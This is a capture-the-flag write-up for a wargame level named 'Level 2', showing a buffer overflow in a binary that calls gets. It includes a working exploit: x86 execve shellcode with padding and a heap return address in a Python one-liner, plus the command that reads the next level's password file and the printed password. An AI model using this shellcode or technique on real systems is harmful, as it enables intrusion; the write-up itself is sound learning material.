# Level 2

```bash
su level2 # 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Steps

We see a `gets` getting called with a buffer of `0x4c` size. The input length is not checked with this function, and an overflow can easily occur.

To get the **size of the overflow**, we can:
- use a **pattern generator**
- calculate the *offset from the buffer*: `0x4c` (buffer len) + `4` (push EBP).

The binary doesn't have a shell code. So we have to provide it to him.
- We could call the **buffer** of `gets`, but there is a check later leading to an `exit` if the given address if in the stack (`0bx`).
- We could write the code inside a environment variable, but same story the checks makes an exit.
- We see in the program that the buffer is later copied inside a `strdup`. This function internally calls for `malloc` which store memory in an other section: the **heap**.

We can thank to this copy a **shellcode** inside the heap, and call its address since its not randomised.

```bash
$ ltrace ./level2
> blabla
...
strdup("blabla") = 0x0804a008
...

$ printf "%x" 134520840
0804A008
```

We can do the **injection**

```bash
$ python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 59 * 'X' + '\x08\x04\xa0\x08'[::-1]" > /tmp/2
$ cat /tmp/2 - | ./level2

$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

